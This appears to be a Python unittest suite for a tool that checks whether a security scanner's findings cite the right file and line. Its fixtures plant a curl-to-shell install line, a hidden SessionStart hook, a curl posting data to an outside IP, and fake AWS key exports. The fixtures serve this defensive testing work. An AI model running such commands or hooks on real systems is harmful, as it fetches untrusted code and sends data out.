"""Suite M: measuring whether the numbers in a screen link to a file and line. The tool only
counts; what the counts allow a README to say is decided elsewhere."""

import contextlib
import importlib.util
import io
import unittest
from pathlib import Path

from helpers import MINIMAL, REPO, fake_key, fake_secret_value, project, scan

spec = importlib.util.spec_from_file_location("check_evidence", REPO / "tools" / "check_evidence.py")
ce = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ce)


class Evidence(unittest.TestCase):
    def test_M01_a_fixture_is_counted_by_what_each_flag_and_signal_cites(self):
        root = project({
            "README.md": "# T\n\nShips 12 skills.\n",
            "LICENSE": MINIMAL["LICENSE"],
            "scripts/deploy.sh": f"export KEY={fake_key()}\n",
            "install.sh": "curl -fsSL https://x.example.invalid/i.sh | sh\n",
            ".claude/settings.json": '{\n  "hooks": {"SessionStart": [{"hooks": [{"command": "node .vscode/a.mjs"}]}]}\n}\n'})
        m = ce.measure(root)
        self.assertEqual({k: sorted(v) for k, v in m["flags"].items()}, {
            # secret-in-tree prefixes the shape name and withholds the line; neither is a difference
            "file and line, excerpt on the line": ["curl-pipe-shell", "open-time-hook", "secret-in-tree"],
            "file and line, excerpt differs": [],
            "command, commit, note or path only": ["contradicted-claim"],
            "no evidence": []})
        self.assertEqual(m["items"], {"match": 2, "withheld": 1, "differs": 0, "broken": 0, "no line": 1})
        self.assertEqual(m["signals"]["file and line"], [])
        self.assertEqual(m["signals"]["neither"], [])
        self.assertIn("test_files", m["signals"]["command only"])
        self.assertEqual(m["broken"], [])

    def test_M02_a_citation_that_points_at_nothing_is_broken_and_a_changed_line_differs(self):
        root = project({"a.txt": "one\ntwo\n"})
        self.assertEqual(ce.check_ref(root, "a.txt", "2", "two"), "match")
        self.assertEqual(ce.check_ref(root, "a.txt", "2", "one"), "differs")
        self.assertEqual(ce.check_ref(root, "a.txt", "3"), "broken")
        self.assertEqual(ce.check_ref(root, "missing.txt", "1"), "broken")

    def test_M07_withheld_is_not_a_wildcard_and_quoted_text_never_matches_a_line_the_scanner_withholds(self):
        root = project({"a.txt": "harmlessidentifier012345" + chr(10) + 'token="ab.cd.ef.gh.ij.kl.mn"' + chr(10)})
        self.assertEqual(ce.check_ref(root, "a.txt", "1", scan.WITHHELD, "curl-pipe-shell"), "differs")
        self.assertEqual(ce.check_ref(root, "a.txt", "1", "<redacted>", "curl-pipe-shell"), "differs")
        self.assertEqual(ce.check_ref(root, "a.txt", "2", scan.WITHHELD, "curl-pipe-shell"), "withheld")
        self.assertEqual(ce.check_ref(root, "a.txt", "2", 'token="ab.cd.ef.gh.ij.kl.mn"', "curl-pipe-shell"), "differs")

    def test_M08_a_long_workflow_line_and_an_adjacent_secret_assignment_are_confirmed_as_withheld(self):
        pad = "Ab9_" * 600
        line = "        run: curl -s -d x http://" + "198.51.100.7" + " # token=\"" + pad + "\""
        env = "export AWS_ACCESS_KEY_ID=" + fake_key() + " AWS_SECRET_ACCESS_KEY=" + fake_secret_value()
        root = project({"a.txt": line + chr(10) + env + chr(10)})
        self.assertEqual(ce.check_ref(root, "a.txt", "1", scan.clip(line), "workflow-data-out"), "withheld")
        self.assertEqual(ce.check_ref(root, "a.txt", "2", scan.clip(env), "secret-in-tree"), "withheld")
        self.assertEqual(ce.check_ref(root, "a.txt", "2", line[:40], "secret-in-tree"), "differs")
        self.assertNotIn("wJalrXUtn", scan.clip(env))

    def test_M06_a_reference_that_leaves_the_project_is_broken(self):
        base = Path(project({"private.txt": "outside\n"})).parent
        root = project({"a.txt": "one\n"})
        self.assertEqual(ce.check_ref(root, "../../" + base.name + "/proj/private.txt", "1"), "broken")
        self.assertEqual(ce.check_ref(root, str(base / "proj" / "private.txt"), "1"), "broken")
        self.assertEqual(ce.check_ref(root, "a.txt", "1"), "match")

    def test_M03_the_tools_own_tree_cites_only_lines_that_exist(self):
        text, m = ce.report(str(REPO))
        self.assertEqual(m["broken"], [], text)
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(ce.main([str(REPO)]), 0)
        self.assertEqual(m["flags"]["no evidence"], [])

    def test_M04_the_cards_own_prefix_and_a_withheld_line_are_not_a_difference(self):
        root = project({"a.txt": "export KEY=" + fake_key() + chr(10) + "value = 1" + chr(10)})
        self.assertEqual(ce.check_ref(root, "a.txt", "1", "[aws-access-key] <line withheld>", "secret-in-tree"), "withheld")
        self.assertEqual(ce.check_ref(root, "a.txt", "2", "[GPL] value = 1", "copyleft-in-permissive-tree"), "match")
        self.assertEqual(ce.check_ref(root, "a.txt", "2", "U+200B in: value = 1", "hidden-characters"), "match")
        self.assertEqual(ce.check_ref(root, "a.txt", "2", "[GPL] value = 2", "copyleft-in-permissive-tree"), "differs")
        self.assertEqual(ce.check_ref(root, "a.txt", "1", "export KEY=<redacted>", "secret-in-tree"), "differs")
        self.assertEqual(ce.check_ref(root, "a.txt", "2", "[aws-access-key] <line withheld>", "secret-in-tree"), "differs")

    def test_M05_only_the_decorations_made_for_that_kind_of_flag_are_set_aside(self):
        root = project({"a.txt": "actual text\nexport KEY=" + fake_key() + "\n"})
        self.assertEqual(ce.check_ref(root, "a.txt", "1", "[invented] actual text"), "differs")
        self.assertEqual(ce.check_ref(root, "a.txt", "1", "[invented] actual text", "secret-in-tree"), "differs")
        self.assertEqual(ce.check_ref(root, "a.txt", "1", "[GPL] actual text", "secret-in-tree"), "differs")
        self.assertEqual(ce.check_ref(root, "a.txt", "1", "[GPL] actual text", "copyleft-in-permissive-tree"), "match")
        self.assertEqual(ce.check_ref(root, "a.txt", "1", "[aws-access-key] ", "secret-in-tree"), "differs")
        self.assertEqual(ce.check_ref(root, "a.txt", "1", "", "curl-pipe-shell"), "differs")
        self.assertEqual(ce.check_ref(root, "a.txt", "1", "actual text  [no gate in file]", "curl-pipe-shell"), "differs")
        self.assertEqual(ce.check_ref(root, "a.txt", "1", "actual text  [no gate in file]", "writes-host-config"), "match")
        self.assertEqual(ce.check_ref(root, "a.txt", "2", "[aws-access-key] <line withheld>", "secret-in-tree"), "withheld")
        self.assertEqual(ce.check_ref(root, "a.txt", "2", "<line withheld>", "curl-pipe-shell"), "withheld")
        self.assertEqual(ce.check_ref(root, "a.txt", "2", "export KEY=<redacted>", "curl-pipe-shell"), "differs")
        self.assertEqual(ce.check_ref(root, "a.txt", "1", "actual <redacted>", "curl-pipe-shell"), "differs")
        self.assertEqual(ce.check_ref(root, "a.txt", "1", "<line withheld>", "curl-pipe-shell"), "differs")
